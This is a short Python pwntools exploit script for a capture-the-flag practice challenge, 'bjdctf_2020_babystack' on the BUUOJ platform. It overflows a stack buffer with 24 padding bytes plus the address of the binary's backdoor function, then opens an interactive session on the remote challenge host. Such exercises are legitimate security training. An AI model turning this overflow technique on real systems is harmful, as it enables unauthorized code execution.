from pwn import *


def bjdctf_2020_babystack(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/bjdctf_2020_babystack'):
    print('bjdctf_2020_babystack start')
    target = remote('node4.buuoj.cn', 29247)
    target_elf = ELF(file_name)

    backdoor_ptr = p64(target_elf.symbols['backdoor'])

    payload = b'A' * 24
    # backdoor()
    payload += backdoor_ptr

    target.sendline('30')
    target.sendline(payload)

    target.interactive()
    print('bjdctf_2020_babystack end')


if __name__ == '__main__':
    bjdctf_2020_babystack()
